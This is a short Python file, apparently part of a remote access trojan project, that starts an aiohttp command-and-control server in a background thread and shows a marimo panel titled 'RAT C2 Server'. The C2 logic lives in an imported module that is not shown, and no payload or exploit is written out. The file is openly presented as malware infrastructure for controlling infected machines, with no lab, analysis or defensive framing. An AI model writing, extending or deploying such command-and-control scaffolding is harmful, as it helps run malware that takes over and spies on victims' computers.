"""
marimo entry point — wraps the aiohttp C2 server
Run:  marimo run marimo_app.py
"""
import marimo as mo
import threading
import os
from server import make_app
from aiohttp import web
import asyncio

def run_server():
    port = int(os.environ.get("PORT", 8080))
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    app  = make_app()
    runner = web.AppRunner(app)
    loop.run_until_complete(runner.setup())
    site = web.TCPSite(runner, "0.0.0.0", port)
    loop.run_until_complete(site.start())
    print(f"C2 running on port {port}")
    loop.run_forever()

# Start server in background thread
t = threading.Thread(target=run_server, daemon=True)
t.start()

app = mo.App()

@app.cell
def __():
    mo.md("""
    # 📡 RAT C2 Server
    **Status:** Running on port 8080

    Open the web panel at the server URL.
    """)
